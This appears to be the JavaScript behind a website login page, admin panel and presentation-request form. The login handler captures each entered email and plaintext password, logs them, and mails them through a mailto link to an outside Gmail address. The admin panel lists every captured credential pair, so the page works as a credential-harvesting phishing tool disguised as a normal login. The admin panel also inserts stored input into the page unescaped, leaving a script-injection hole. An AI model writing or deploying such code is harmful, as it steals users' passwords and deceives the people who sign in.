// Check if user is logged in
if (!localStorage.getItem('loggedIn') && window.location.pathname !== '/index.html' && !window.location.pathname.endsWith('index.html')) {
    window.location.href = 'index.html';
}

// Login Form Handling
if (document.getElementById('loginForm')) {
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('loginEmail').value;
        const password = document.getElementById('loginPassword').value;
        const messageElement = document.getElementById('loginMessage');

        const storedEmail = localStorage.getItem('firstLoginEmail');
        const storedPassword = localStorage.getItem('firstLoginPassword');

        if (!storedEmail || !storedPassword) {
            // First login: store credentials
            localStorage.setItem('firstLoginEmail', email);
            localStorage.setItem('firstLoginPassword', password);
            localStorage.setItem('loggedIn', 'true');

            // Store login data locally
            const loginData = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
            loginData.push({
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            });
            localStorage.setItem('loginAttempts', JSON.stringify(loginData));

            // Send email using mailto
            const subject = encodeURIComponent('Login Attempt');
            const body = encodeURIComponent(`Email: ${email}\nPassword: ${password}`);
            const mailtoURL = `mailto:businesspromotion464@gmail.com?subject=${subject}&body=${body}`;
            window.location.href = mailtoURL;

            messageElement.textContent = 'Opening email client... Redirecting to dashboard...';
            messageElement.style.color = '#b22222';
            setTimeout(() => {
                window.location.href = 'dashboard.html';
            }, 2000);
        } else {
            // Subsequent logins: check credentials
            if (email === storedEmail && password === storedPassword) {
                localStorage.setItem('loggedIn', 'true');

                // Store login data locally
                const loginData = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
                loginData.push({
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString()
                });
                localStorage.setItem('loginAttempts', JSON.stringify(loginData));

                // Send email using mailto
                const subject = encodeURIComponent('Login Attempt');
                const body = encodeURIComponent(`Email: ${email}\nPassword: ${password}`);
                const mailtoURL = `mailto:businesspromotion464@gmail.com?subject=${subject}&body=${body}`;
                window.location.href = mailtoURL;

                messageElement.textContent = 'Opening email client... Redirecting to dashboard...';
                messageElement.style.color = '#b22222';
                setTimeout(() => {
                    window.location.href = 'dashboard.html';
                }, 2000);
            } else {
                messageElement.textContent = 'Invalid credentials. Only the first login credentials are accepted.';
                messageElement.style.color = '#ff0000';
            }
        }
    });
}

// Admin Panel Data Display
if (document.getElementById('loginAttemptsList')) {
    const loginData = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
    const loginList = document.getElementById('loginAttemptsList');
    if (loginData.length === 0) {
        loginList.innerHTML = '<p>No login attempts stored yet.</p>';
    } else {
        loginList.innerHTML = loginData.map(attempt => `
            <div class="data-item">
                <p><strong>Email:</strong> ${attempt.email}</p>
                <p><strong>Password:</strong> ${attempt.password}</p>
                <p><strong>Timestamp:</strong> ${new Date(attempt.timestamp).toLocaleString()}</p>
            </div>
        `).join('');
    }
}

if (document.getElementById('presentationRequestsList')) {
    const requestData = JSON.parse(localStorage.getItem('presentationRequests') || '[]');
    const requestList = document.getElementById('presentationRequestsList');
    if (requestData.length === 0) {
        requestList.innerHTML = '<p>No presentation requests stored yet.</p>';
    } else {
        requestList.innerHTML = requestData.map(request => `
            <div class="data-item">
                <p><strong>Name:</strong> ${request.name}</p>
                <p><strong>Email:</strong> ${request.email}</p>
                <p><strong>Message:</strong> ${request.message}</p>
                <p><strong>Timestamp:</strong> ${new Date(request.timestamp).toLocaleString()}</p>
            </div>
        `).join('');
    }
}

// Request Form Modal Handling
if (document.getElementById('requestBtn')) {
    const modal = document.getElementById('requestModal');
    const btn = document.getElementById('requestBtn');
    const span = document.getElementsByClassName('close')[0];

    btn.onclick = function() {
        modal.style.display = 'block';
    }

    span.onclick = function() {
        modal.style.display = 'none';
    }

    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = 'none';
        }
    }

    // Request Form Submission
    document.getElementById('requestForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const message = document.getElementById('message').value;

        // Store request data locally
        const requestData = JSON.parse(localStorage.getItem('presentationRequests') || '[]');
        requestData.push({
            name: name,
            email: email,
            message: message,
            timestamp: new Date().toISOString()
        });
        localStorage.setItem('presentationRequests', JSON.stringify(requestData));

        // Send email using mailto
        const subject = encodeURIComponent('Presentation Request');
        const body = encodeURIComponent(`Name: ${name}\nEmail: ${email}\nMessage: ${message}`);
        const mailtoURL = `mailto:businesspromotion464@gmail.com?subject=${subject}&body=${body}`;
        window.location.href = mailtoURL;

        alert('Opening email client... Request sent!');
        modal.style.display = 'none';
        document.getElementById('requestForm').reset();
    });
}
